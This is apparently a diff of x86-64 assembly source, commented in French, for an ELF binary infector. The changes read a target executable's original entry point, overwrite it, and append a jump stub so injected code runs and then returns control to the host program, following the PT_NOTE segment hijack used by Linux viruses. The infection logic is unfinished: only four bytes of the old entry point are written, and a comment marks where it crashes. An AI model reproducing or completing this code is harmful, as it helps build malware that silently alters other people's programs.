@@ -25,16 +25,13 @@ section .data
 
     taille_exagereted dq 0xc000
 
-
-    ;jump_insctruction db 0xe9
-    ;tmp
-    ;jump_offset dd -0x00000073F
-
-    jump_insctruction db 0x48, 0xb8, 0x40, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0
-
+    ;jump_insctruction db 0x48, 0xb8, 0x40, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0
+    jump_insctruction db 0x48, 0xb8
+    ;ajout de l'old entry point
+    jump db 0x00, 0x00,0x00, 0x00, 0xff, 0xe0
+;   
 ;
-;
-;0xc000046
+;; 7F66AACB6075 offset ou ca casse 
 
 
 
@@ -52,6 +49,8 @@ section .bss
     file_size resq 1
 
     new_vaddr resq 1
+
+    old_entry_point resq 1
 
 
 section .text
@@ -142,7 +141,7 @@ _start:
 
 
 
-;========= Trouver segment NOTE  =========
+;========= Trouver segment NOTE  ========= 
 
 mov r15, buffer
 
@@ -184,7 +183,22 @@ mov r15, buffer
 
     xor rax,rax
 
-;=============== entry point =================
+;=============== Get old entry point =================
+
+    mov rax, 8          ; lseek curseur
+    mov rdi, [file_descriptor]
+    mov rsi, 0x18     ; offset jusqu'au entry point
+    mov rdx, 0          
+    syscall     
+
+
+    mov rax, 0          ; read 
+    mov rdi, [file_descriptor]
+    mov rsi, old_entry_point  ; adresse où stocker l'ancien entry point
+    mov rdx, 8          ; taille de l'entrée à lire (8 octets pour un pointeur)
+    syscall
+
+;=============== change entry point =================
     mov rax, 8          ; lseek curseur
     mov rdi, [file_descriptor]
     mov rsi, 0x18     ; offset jusqu'au entry point
@@ -342,23 +356,38 @@ mov r15, buffer
     mov rax, 1         
     mov rdi, [file_descriptor]       
     mov rsi, jump_insctruction  
-    mov rdx, 12
+    mov rdx, 2
     syscall    
 
 
 ; =============== Ajout offset a sauter  =================
 
-;    mov rax, 8          
-;    mov rdi, [file_descriptor]
-;    mov rsi, 0 
-;    mov rdx, 2        ; fin du fichier 
-;   syscall  
+    mov rax, 8          
+    mov rdi, [file_descriptor]
+    mov rsi, 0 
+    mov rdx, 2        ; fin du fichier 
+   syscall  
 
-;    mov rax, 1         
-;    mov rdi, [file_descriptor]       
-;    mov rsi, jump_offset 
-;    mov rdx, 4
-;    syscall
+    mov rax, 1         
+    mov rdi, [file_descriptor]       
+    mov rsi, old_entry_point 
+    mov rdx, 4
+    syscall
+      
+
+; =============== jump  =================
+
+    mov rax, 8          
+    mov rdi, [file_descriptor]
+    mov rsi, 0 
+    mov rdx, 2        ; fin du fichier 
+   syscall  
+
+    mov rax, 1         
+    mov rdi, [file_descriptor]       
+    mov rsi, jump
+    mov rdx, 6
+    syscall
       
 
 
